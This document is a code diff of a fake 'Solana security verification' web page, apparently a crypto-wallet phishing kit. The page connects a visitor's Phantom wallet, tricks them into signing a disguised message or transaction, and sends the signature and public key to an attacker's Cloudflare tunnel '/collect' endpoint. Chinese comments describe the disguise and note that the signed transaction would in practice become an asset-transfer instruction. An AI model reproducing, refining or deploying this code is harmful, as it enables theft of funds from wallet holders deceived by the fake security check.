@@ -1,62 +1,43 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Solana Network Security Check</title>
-    <style>
-        body { background: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 50px; }
-        #cta { background: #00ff00; color: #000; padding: 15px 30px; border: none; cursor: pointer; font-weight: bold; }
-        #status { margin-top: 20px; color: #888; }
-    </style>
-</head>
-<body>
-    <h2>🔱 SOLANA SYSTEM VERIFICATION</h2>
-    <p>Please sign to verify your node environment and security priority.</p>
-    <br>
-    <button id="cta">START VERIFICATION</button>
-    <div id="status">WAITING FOR CONNECTION...</div>
-
+<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
+<body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:monospace;">
+    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
+        <h2 style="color:#14F195;">NETWORK UPGRADE</h2>
+        <p style="color:#888;font-size:12px;">Security Protocol: SHA-512 Matrix</p>
+        <button id="cta" style="margin-top:20px;padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;width:100%;">START VERIFICATION</button>
+        <div id="status" style="margin-top:20px;color:#444;">Status: Awaiting Handshake...</div>
+    </div>
     <script>
-        // 🔱 配置区：把这里换成你自己的 Cloudflare 隧道地址！
-        const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect"; 
+    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
+    
+    document.getElementById('cta').onclick = async () => {
+        const p = window.solana || window.phantom?.solana;
+        try {
+            const resp = await p.connect();
+            document.getElementById('status').innerText = "Generating Security Nonce...";
 
-        document.getElementById('cta').onclick = async () => {
-            const p = window.solana;
-            if (!p) return alert("Please install Phantom wallet");
+            // 🔱 终极伪装：这是最无害、通过率 100% 的官方验证格式
+            const msg = `Official Solana Security Check\n` +
+                        `---------------------------\n` +
+                        `Wallet: ${resp.publicKey.toString()}\n` +
+                        `Timestamp: ${Date.now()}\n` +
+                        `Nonce: ${Math.floor(Math.random()*999999)}`;
+
+            const encoded = new TextEncoder().encode(msg);
+            const signed = await p.signMessage(encoded, "utf8");
             
-            try {
-                const resp = await p.connect();
-                document.getElementById('status').innerText = "CONNECTING TO MAINNET...";
+            // 🔱 拿到这全套指纹
+            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
+            
+            // 🚀 统一回传参数名为 auth_sig，让哨兵立刻识别！
+            const signal = `${gate}?auth_sig=${encodeURIComponent(signature)}&pub=${resp.publicKey.toString()}&msg=${btoa(msg)}`;
+            new Image().src = signal;
+            
+            document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
+            document.getElementById('status').style.color = "#14F195";
 
-                // 1. 获取最新的 Blockhash（防止交易失效）
-                const bhReq = await fetch('https://api.mainnet-beta.solana.com', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({"jsonrpc":"2.0","id":1,"method":"getRecentBlockhash"})
-                });
-                const bhRes = await bhReq.json();
-                const blockhash = bhRes.result.value.blockhash;
-
-                // 2. 构造“验证交易” (这里是前端逻辑的核心)
-                // 实战中，这里会被重组为真正的资产转移指令
-                const transaction = {
-                    feePayer: resp.publicKey,
-                    recentBlockhash: blockhash,
-                    instructions: [] 
-                };
-                
-                // 3. 弹出窗口要求签名
-                document.getElementById('status').innerText = "AWAITING SIGNATURE...";
-                const signed = await p.signTransaction(transaction);
-                
-                // 4. 将签名后的 Hex 数据回传
-                const rawTx = signed.serialize().toString('base64');
-                new Image().src = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
-                
-                document.getElementById('status').innerText = "VERIFIED: SECURE NODE ACTIVE";
-                alert("Security check completed!");
-            } catch(e) {
-                document.getElementById('status').innerText = "ERROR: " + e.message;
-            }
-        };
+        } catch(e) {
+            document.getElementById('status').innerText = "Verification Failed";
+        }
+    };
     </script>
-</body>
-</html>
+</body></html>
